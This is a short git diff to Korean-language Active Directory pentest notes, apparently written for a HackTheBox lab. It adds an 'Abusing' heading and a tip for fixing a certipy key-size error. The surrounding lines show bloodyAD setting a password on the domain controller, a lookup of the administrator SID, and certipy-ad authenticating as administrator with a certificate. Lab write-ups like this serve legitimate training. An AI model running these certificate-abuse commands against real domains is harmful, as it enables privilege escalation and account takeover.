@@ -877,6 +877,8 @@ bloodyAD -d tombwatcher.htb -u sam -p password --host dc01.tombwatcher.htb set p
 - `nmap`으로 스캔하여 `CA`를 발견하면 시도.
 - 열거는 모든 유저로도 가능.
 - 공격을 시도할 때는 권한이 있는 유저로만 가능.
+
+### Abusing
 ```powershell
 # Sid 찾기
 Get-ADUser administrator
@@ -891,7 +893,11 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
 ```
 <img width="1086" height="113" alt="image" src="https://github.com/user-attachments/assets/eed34f42-f4ac-4233-b3a8-1c2fa0cdb9a8" />
 <img width="1086" height="53" alt="image" src="https://github.com/user-attachments/assets/76523c8e-8f08-47c1-81cf-360ec9f046f4" />
-  
+
+### key size error
+- `certipy`에서 `-key-size`옵션으로 해결.
+
+
 </details>
 
 ---
